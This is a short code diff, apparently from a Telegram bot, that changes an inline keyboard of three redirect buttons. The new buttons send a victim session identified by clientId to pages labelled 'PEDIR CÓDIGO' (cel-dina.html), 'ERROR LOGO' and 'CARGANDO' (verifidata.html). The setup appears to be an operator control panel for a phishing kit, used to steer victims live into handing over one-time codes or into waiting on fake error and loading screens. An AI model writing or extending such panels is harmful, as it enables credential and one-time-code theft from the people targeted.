@@ -39,9 +39,9 @@ Elige una acción:
   const keyboard = {
     inline_keyboard: [
       [
-        { text: "➡ Redirigir A", callback_data: `redir|${data.clientId}|https://pagina-a.com` },
-        { text: "➡ Redirigir B", callback_data: `redir|${data.clientId}|https://pagina-b.com` },
-        { text: "➡ Redirigir C", callback_data: `redir|${data.clientId}|https://pagina-c.com` }
+        { text: "➡ PEDIR CÓDIGO", callback_data: `redir|${data.clientId}|cel-dina.html` },
+        { text: "➡ ERROR LOGO", callback_data: `redir|${data.clientId}|errorlogo.html` },
+        { text: "➡ CARGANDO", callback_data: `redir|${data.clientId}|verifidata.html` }
       ]
     ]
   };
